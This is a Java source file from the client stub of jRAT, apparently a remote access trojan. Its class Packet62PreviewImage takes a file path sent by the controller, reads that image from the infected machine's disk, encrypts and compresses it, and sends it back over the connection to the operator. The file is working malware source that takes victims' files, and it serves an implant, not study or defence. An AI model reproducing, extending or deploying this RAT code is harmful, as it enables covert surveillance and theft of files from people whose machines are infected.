package su.jrat.stub.packets.incoming;

import java.awt.image.BufferedImage;
import java.io.File;

import javax.imageio.ImageIO;

import su.jrat.common.compress.GZip;
import su.jrat.common.crypto.Crypto;
import su.jrat.stub.Connection;
import su.jrat.stub.Main;
import su.jrat.stub.packets.outgoing.Packet43PreviewImage;
import su.jrat.stub.utils.ImageUtils;


public class Packet62PreviewImage extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		String file = Connection.readLine();

		BufferedImage screenShot = ImageIO.read(new File(file));
		byte[] buffer = ImageUtils.encode(screenShot);
		buffer = GZip.compress(Crypto.encrypt(buffer, Main.getKey()));

		Connection.addToSendQueue(new Packet43PreviewImage(buffer.length, screenShot.getWidth(), screenShot.getHeight()));

		Connection.dos.write(buffer);

		Connection.lock();

		System.gc();

	}

}
